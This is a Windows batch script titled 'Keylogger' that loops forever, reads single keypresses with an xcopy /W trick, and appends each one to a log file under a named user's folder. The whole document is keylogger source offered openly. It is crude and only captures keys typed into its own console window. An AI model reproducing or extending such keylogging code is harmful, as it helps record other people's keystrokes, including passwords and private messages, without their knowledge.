@echo off
color 0a
title Keylogger
mode con cols=50 lines=20

:start
set "log_file=C:\Users\Durvesh\keylogs.txt"
if not exist "%log_file%" (
    echo Creating log file...
    copy NUL "%log_file%"
)

set "key="
for /F "delims=" %%a in ('xcopy /W "%~f0" "%~f0" 2^>NUL') do if not defined key set "key=%%a"
set "key=%key:~-1%"
if "%key%"=="%" set "key=%%"

echo %key% >> "%log_file%"

goto start
